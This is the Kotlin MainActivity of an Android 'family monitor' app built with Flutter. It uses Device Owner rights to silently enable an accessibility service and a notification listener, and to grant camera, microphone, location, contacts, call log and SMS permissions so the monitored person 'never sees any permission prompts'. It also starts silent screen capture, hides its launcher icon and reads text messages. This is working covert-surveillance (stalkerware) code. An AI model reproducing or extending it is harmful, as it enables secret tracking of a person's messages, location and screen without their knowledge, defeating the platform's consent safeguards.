package com.example.family_monitor

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {

    private val SMS_CHANNEL    = "family_monitor/sms"
    private val SCREEN_CHANNEL = "family_monitor/screen_capture"
    private val REQ_PROJECTION = 1001
    private val REQ_BATTERY    = 1002
    private val REQ_ADMIN      = 1003
    private var pendingScreen: MethodChannel.Result? = null
    private var pendingAdmin:  MethodChannel.Result? = null

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        // Silently activate privileged services when Device Owner is set
        setupDeviceOwnerPrivileges()

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, SMS_CHANNEL)
            .setMethodCallHandler { call, result ->
                if (call.method == "readSms") result.success(readSms(call.argument<Int>("limit") ?: 100))
                else result.notImplemented()
            }

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, SCREEN_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "requestScreenCapture" -> {
                        if (pendingScreen != null) {
                            result.error("ALREADY_PENDING", "pending", null); return@setMethodCallHandler
                        }
                        if (ScreenCaptureService.isDeviceAdminActive(this)) {
                            val i = Intent(this, ScreenCaptureService::class.java).apply {
                                action = ScreenCaptureService.ACTION_START_SILENT
                            }
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
                            else startService(i)
                            result.success(mapOf("granted" to true, "resultCode" to Activity.RESULT_OK))
                            return@setMethodCallHandler
                        }
                        pendingScreen = result
                        startActivityForResult(
                            (getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager)
                                .createScreenCaptureIntent(), REQ_PROJECTION)
                    }
                    "stopScreenCaptureService" -> {
                        startService(Intent(this, ScreenCaptureService::class.java).apply {
                            action = ScreenCaptureService.ACTION_STOP })
                        result.success(true)
                    }
                    "isDeviceAdminActive"  -> result.success(ScreenCaptureService.isDeviceAdminActive(this))
                    "requestDeviceAdmin"   -> {
                        if (ScreenCaptureService.isDeviceAdminActive(this)) {
                            result.success(true); return@setMethodCallHandler
                        }
                        pendingAdmin = result
                        startActivityForResult(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                                ComponentName(this@MainActivity, FamilyDeviceAdminReceiver::class.java))
                            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                "Needed for silent screen monitoring.")
                        }, REQ_ADMIN)
                    }
                    "removeDeviceAdmin" -> {
                        try {
                            (getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager)
                                .removeActiveAdmin(ComponentName(this, FamilyDeviceAdminReceiver::class.java))
                            result.success(true)
                        } catch (e: Exception) { result.error("ERR", e.message, null) }
                    }
                    "requestBatteryOptimizationExemption" -> {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            val pm = getSystemService(PowerManager::class.java)
                            if (!pm.isIgnoringBatteryOptimizations(packageName))
                                startActivityForResult(Intent(
                                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                                    Uri.parse("package:$packageName")), REQ_BATTERY)
                        }
                        result.success(true)
                    }
                    "isBatteryOptimizationExempt" ->
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                            result.success(getSystemService(PowerManager::class.java)
                                .isIgnoringBatteryOptimizations(packageName))
                        else result.success(true)
                    "hideLauncherIcon" -> {
                        try {
                            packageManager.setComponentEnabledSetting(
                                ComponentName(this, "${packageName}.MainActivity"),
                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                android.content.pm.PackageManager.DONT_KILL_APP)
                            result.success(true)
                        } catch (e: Exception) { result.error("ERR", e.message, null) }
                    }
                    "showLauncherIcon" -> {
                        try {
                            packageManager.setComponentEnabledSetting(
                                ComponentName(this, "${packageName}.MainActivity"),
                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                android.content.pm.PackageManager.DONT_KILL_APP)
                            result.success(true)
                        } catch (e: Exception) { result.error("ERR", e.message, null) }
                    }
                    else -> result.notImplemented()
                }
            }
    }

    /**
     * When Device Owner is active, silently enable our two privileged services
     * so the child never sees any permission prompts.
     */
    private fun setupDeviceOwnerPrivileges() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val dpm   = getSystemService(DevicePolicyManager::class.java) ?: return
        val admin = ComponentName(this, FamilyDeviceAdminReceiver::class.java)
        if (!dpm.isDeviceOwnerApp(packageName)) return

        // 1. Enable NotificationListenerService without user going to Settings
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            try {
                dpm.setNotificationListenerEnabled(
                    admin,
                    ComponentName(this, ScreenNotificationListener::class.java),
                    true)
            } catch (_: Exception) {}
        }

        // 2. Enable AccessibilityService silently via secure setting
        try {
            val svcName = "$packageName/${packageName}.SilentAccessibilityService"
            dpm.setSecureSetting(admin, "enabled_accessibility_services", svcName)
            dpm.setSecureSetting(admin, "accessibility_enabled", "1")
        } catch (_: Exception) {}

        // 3. Grant runtime permissions silently
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            listOf(
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.READ_SMS
            ).forEach { perm ->
                try {
                    dpm.setPermissionGrantState(admin, packageName, perm,
                        DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
                } catch (_: Exception) {}
            }
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            REQ_PROJECTION -> {
                val p = pendingScreen; pendingScreen = null
                if (resultCode == Activity.RESULT_OK && data != null) {
                    val i = Intent(this, ScreenCaptureService::class.java).apply {
                        action = ScreenCaptureService.ACTION_START
                        putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, resultCode)
                        putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, data)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
                    else startService(i)
                    p?.success(mapOf("granted" to true, "resultCode" to resultCode))
                } else p?.success(mapOf("granted" to false, "resultCode" to resultCode))
            }
            REQ_ADMIN -> { val p = pendingAdmin; pendingAdmin = null; p?.success(resultCode == Activity.RESULT_OK) }
        }
    }

    private fun readSms(limit: Int): List<Map<String, Any>> {
        val msgs = mutableListOf<Map<String, Any>>()
        try {
            val c = contentResolver.query(Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type"), null, null, "date DESC LIMIT $limit")
            c?.use {
                val ai = it.getColumnIndex("address"); val bi = it.getColumnIndex("body")
                val di = it.getColumnIndex("date");    val ti = it.getColumnIndex("type")
                while (it.moveToNext())
                    msgs.add(mapOf("address" to (it.getString(ai) ?: ""), "body" to (it.getString(bi) ?: ""),
                        "date" to it.getLong(di), "type" to it.getInt(ti)))
            }
        } catch (_: Exception) {}
        return msgs
    }
}
